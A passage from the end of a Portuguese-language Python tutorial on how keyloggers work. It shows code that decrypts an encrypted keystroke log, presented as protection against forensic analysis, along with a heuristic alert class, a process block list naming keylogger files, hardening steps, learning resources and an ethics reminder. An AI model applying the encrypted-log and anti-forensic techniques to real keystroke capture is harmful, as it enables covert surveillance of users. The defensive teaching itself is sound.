    with open("log.enc", "rb") as f:
        for linha in f:
            decriptografado = cipher.decrypt(linha.strip())
            print(decriptografado.decode())
```

**O que aprendeu:**
- Encriptação assimétrica
- Segurança de dados
- Proteção contra análise forense

#### 3.3 - Sistema de Alertas

**Objetivo:** Detectar comportamentos suspeitos

```python
class MonitorSeguranca:
    def __init__(self):
        self.tentativas_senha = 0
        self.sequencia_rapida = []
    
    def analisar_entrada(self, key):
        # Detectar digitação rápida demais
        import time
        agora = time.time()
        self.sequencia_rapida.append(agora)
        
        # Últimas 5 teclas
        recentes = [t for t in self.sequencia_rapida if agora - t < 1]
        
        if len(recentes) > 10:
            print("⚠️ ALERTA: Entrada muito rápida (possível automatização)")
            return "ALERTA_VELOCIDADE"
        
        # Detectar palavras-chave
        palavras_suspeitas = ["password", "admin", "delete"]
        for palavra in palavras_suspeitas:
            if palavra in str(key).lower():
                self.tentativas_senha += 1
                if self.tentativas_senha > 5:
                    return "ALERTA_MULTIPLAS_SENHAS"
        
        return "OK"
```

**O que aprendeu:**
- Detecção de anomalias
- Heurística de segurança
- Análise comportamental

---

### Desafios de Segurança

#### 🔒 Desafio 1: Defenda-se

Crie um script que:
1. Detecta tentativas de keylogger
2. Bloqueia processos suspeitos
3. Alerta o usuário

```python
# Pseudocódigo
def defender_contra_keylogger():
    processos_suspeitos = ["keylogger.py", "logger.exe", "hook.sys"]
    
    for processo in obter_processos():
        if qualquer(p in processo for p in processos_suspeitos):
            print(f"🚨 AMEAÇA DETECTADA: {processo}")
            matar_processo(processo)
            alertar_usuario()
```

#### 🔒 Desafio 2: Endurecimento

Configure seu PC para:
1. Desabilitar downloads de macros
2. Ativar SmartScreen
3. Configurar política de execução de scripts

```powershell
# PowerShell (admin)
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
Enable-WindowsOptionalFeature -Online -FeatureName Containers
```

#### 🔒 Desafio 3: Análise de Código

Analise um malware de verdade (em sandbox):
1. Identifique técnicas anti-análise
2. Trace comunicações de rede
3. Documente comportamento

---

## Recursos de Aprendizado Recomendados

### 📚 Livros

| Livro | Autor | Tópicos |
|-------|-------|---------|
| **Practical Malware Analysis** | Michael Sikorski | Engenharia reversa, malware |
| **The Web Application Hacker's Handbook** | Stuttard & Pinto | Web security, SQL injection |
| **Security Engineering** | Ross Anderson | Fundamentos de segurança |
| **Pentesting** | Georgia Weidman | Hacking ético, testes |
| **The Art of Exploitation** | Jon Erickson | Buffer overflow, exploits |

### 🎥 Canais e Cursos

```
YouTube:
- NetworkChuck (Cybersecurity)
- John Hammond (Hacking)
- IppSec (TryHackMe)
- STOK (Bug Bounty)

Plataformas de Curso:
- TryHackMe (prático)
- HackTheBox (CTFs)
- Coursera (acadêmico)
- Udemy (variado)
```

### 🌐 Sites Educacionais

```
Documentação:
- OWASP (Web security)
- NIST (Standards)
- CWE (Vulnerabilidades)
- ATT&CK Framework (Táticas)

Prática:
- PortSwigger Web Security Academy
- PentesterLab
- SANS Cyber Aces
- Root-Me
```

### 🔗 Links Diretos

```
Python & Segurança:
- https://pynput.readthedocs.io/ (Pynput docs)
- https://docs.python.org/3/ (Python oficial)
- https://github.com/carlospolop/hacktricks (Hacktricks)

LGPD & Compliance:
- https://www.gov.br/cidadania/pt-br/lgpd (LGPD oficial)
- https://gdpr-info.eu/ (GDPR info)

Ferramentas Open Source:
- https://www.wireshark.org/ (Análise de rede)
- https://www.kali.org/ (Distro penetration)
- https://owasp.org/www-project-zap/ (Web scanning)
```

---

## Certificações Relevantes

Se você quer seguir carreira em segurança:

```
Nível Iniciante:
├─ CompTIA Security+
├─ EC-Council CEH (Certified Ethical Hacker)
└─ Offensive Security OSCP

Nível Intermediário:
├─ GIAC Certified Incident Handler (GCIH)
├─ Certified Ethical Hacker Advanced
└─ Offensive Security OSEP

Nível Avançado:
├─ CISM (Certified Information Security Manager)
├─ CISSP (Certified Information Systems Security)
└─ Offensive Security OSCE
```

---

## Conclusão

### O que você aprendeu:

✅ Como funcionam keyloggers internamente  
✅ Programação em Python (funções, callbacks, eventos)  
✅ Captura de entrada do teclado  
✅ Armazenamento e logging de dados  
✅ Análise de segurança e ameaças  
✅ Técnicas de defesa e proteção  
✅ Considerações éticas e legais  

### O que vem a seguir:

```
Seu Progresso em Segurança:
│
├─ Conhecimento Básico (✓ Você está aqui)
│  └─ Entender como ataques funcionam
│
├─ Análise Intermediária
│  └─ Detectar e analisar malware
│
├─ Defesa Avançada
│  └─ Proteger sistemas e redes
│
├─ Pentesting Profissional
│  └─ Auditar segurança de forma autorizada
│
└─ Especialização
   └─ Carreira em Segurança Ofensiva/Defensiva
```

### Lembre-se:

```
┌─────────────────────────────────────────────┐
│ "Com Grande Poder Vem Grande              │
│  Responsabilidade"                         │
│           - Ben Parker                     │
│                                            │
│ Use este conhecimento para:                │
│  • Defender sistemas                       │
│  • Proteger usuários                       │
│  • Pesquisar vulnerabilidades              │
│  • Ensinar segurança                       │
│                                            │
│ Nunca para:                                │
│  • Prejudicar pessoas                      │
│  • Roubar informações                      │
│  • Cometer crimes                          │
│  • Violar privacidade                      │
└─────────────────────────────────────────────┘
```

---

## Links Finais

- 📖 Documentação Pynput: https://pynput.readthedocs.io/
- 🐍 Python Docs: https://docs.python.org/3/
- 📚 Real Python: https://realpython.com/
- 🔐 OWASP: https://owasp.org/
- 📊 MITRE ATT&CK: https://attack.mitre.org/

---

**Criado para fins educacionais. Use este conhecimento responsavelmente! 🎓**

**Última atualização:** 2026-08-14  
**Versão:** 2.0 (Expandida com conteúdo de Curso Completo)
